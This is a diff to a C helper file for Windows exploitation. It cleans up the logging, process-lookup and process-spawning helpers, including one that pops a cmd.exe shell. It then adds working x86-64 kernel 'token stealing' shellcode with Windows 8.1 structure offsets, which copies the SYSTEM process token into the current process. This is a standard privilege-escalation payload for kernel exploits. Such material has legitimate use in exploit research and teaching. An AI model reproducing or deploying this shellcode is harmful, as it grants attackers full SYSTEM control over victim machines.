@@ -24,7 +24,6 @@ void static __xlog(const char* prio, const char* format, va_list args)
         size_t fmt_len = strlen(format)+strlen(prio)+2;
         uint8_t *fmt = alloca(fmt_len);
         RtlFillMemory(fmt, fmt_len, '\x00');
-        // TODO: add timestamp
         sprintf(fmt, "%s %s", prio, format);
         vfprintf(stderr, fmt, args);
         fflush(stderr);
@@ -94,7 +93,8 @@ DWORD GetProcessIdByName(LPTSTR processName)
 {
         HANDLE hProcessSnap, hProcess;
         PROCESSENTRY32 pe32;
-        DWORD dwPriorityClass, dwPid;
+        DWORD dwPid;
+        BOOL isMatch;
 
         dwPid = -1;
 
@@ -114,19 +114,10 @@ DWORD GetProcessIdByName(LPTSTR processName)
 
         do
         {
-                BOOL isMatch = FALSE;
-
-                dwPriorityClass = 0;
+                isMatch = FALSE;
                 hProcess = OpenProcess( PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID );
                 if(!hProcess)
                         continue;
-
-
-                dwPriorityClass = GetPriorityClass( hProcess );
-                if( !dwPriorityClass ){
-                        CloseHandle(hProcess);
-                        continue;
-                }
 
                 isMatch = strcmp(processName, pe32.szExeFile)==0;
                 CloseHandle(hProcess);
@@ -166,7 +157,7 @@ BOOL CheckIsSystem()
 
 
 
-BOOL PopupNewProcess(LPTSTR lpCommandLine)
+BOOL PopupNewProcess(LPSTR lpCommandLine)
 {
         STARTUPINFO si;
         PROCESS_INFORMATION pi;
@@ -177,18 +168,9 @@ BOOL PopupNewProcess(LPTSTR lpCommandLine)
 
         info("Spawning '%s'...\n", lpCommandLine);
 
-        if( !CreateProcess(
-                    NULL,                                    // No module name (use command line)
-                    lpCommandLine,                           // Command line
-                    NULL,                                    // Process handle not inheritable
-                    NULL,                                    // Thread handle not inheritable
-                    FALSE,                                   // Set handle inheritance to FALSE
-                    CREATE_NEW_CONSOLE,                      // Creation flags
-                    NULL,                                    // Use parent's environment block
-                    NULL,                                    // Use parent's starting directory
-                    &si,                                     // Pointer to STARTUPINFO structure
-                    &pi)                                     // Pointer to PROCESS_INFORMATION structure
-            ){
+        if( !CreateProcessA( NULL, lpCommandLine, NULL,
+                            NULL, FALSE, CREATE_NEW_CONSOLE,
+                            NULL, NULL, &si, &pi) ){
                 perr("CreateProcess failed");
                 return FALSE;
         }
@@ -203,3 +185,51 @@ void PopupCmd()
         PopupNewProcess("c:\\windows\\system32\\cmd.exe");
         return;
 }
+
+
+/**
+ * Token stealing helper
+ */
+
+#ifdef __WIN81__
+
+#ifdef __X86_64__
+#define KIINITIAL_THREAD  "\x88\x01"
+#define EPROCESS_OFFSET   "\xb8\x00"
+#define PROCESSID_OFFSET  "\xe0\x02"
+#define FLINK_OFFSET      "\xe8\x02"
+#define TOKEN_OFFSET      "\x48\x03"
+#define SYSTEM_PID        "\x04"
+#endif
+
+#endif
+
+
+/**
+ * Shellcode source: https://gist.github.com/hugsy/763ec9e579796c35411a5929ae2aca27
+ */
+
+#define StealTokenShellcodeLength 80
+
+const char StealTokenShellcode[StealTokenShellcodeLength] = ""
+        "\x50"                                                      // push rax
+        "\x53"                                                      // push rbx
+        "\x51"                                                      // push rcx
+        "\x65\x48\x8b\x04\x25" KIINITIAL_THREAD "\x00\x00"          // mov rax, gs:[KIINITIAL_THREAD]
+        "\x48\x8b\x80" EPROCESS_OFFSET "\x00\x00"                   // mov rax, [rax+EPROCESS_OFFSET]
+        "\x48\x89\xc3"                                              // mov rbx, rax
+        "\x48\x8b\x9b" FLINK_OFFSET "\x00\x00"                      // mov rbx, [rbx+FLINK_OFFSET]
+        "\x48\x81\xeb" FLINK_OFFSET "\x00\x00"                      // sub rbx, FLINK_OFFSET
+        "\x48\x8b\x8b" PROCESSID_OFFSET "\x00\x00"                  // mov rcx, [rbx+PROCESSID_OFFSET]
+        "\x48\x83\xf9" SYSTEM_PID                                   // cmp rcx, SYSTEM_PID
+        "\x75\xe5"                                                  // jnz -0x19
+        "\x48\x8b\x8b" TOKEN_OFFSET "\x00\x00"                      // mov rcx, [rbx + TOKEN_OFFSET]
+        "\x80\xe1\xf0"                                              // and cl, 0xf0
+        "\x48\x89\x88" TOKEN_OFFSET "\x00\x00"                      // mov [rax + TOKEN_OFFSET], rcx
+        "\x59"                                                      // pop rcx
+        "\x5b"                                                      // pop rbx
+        "\x58"                                                      // pop rax
+        "\x58\x58\x58\x58\x58"                                      // pop rax; pop rax; pop rax; pop rax; pop rax;
+        "\x48\x31\xc0"                                              // xor rax, rax
+        "\xc3"                                                      // ret
+        "";
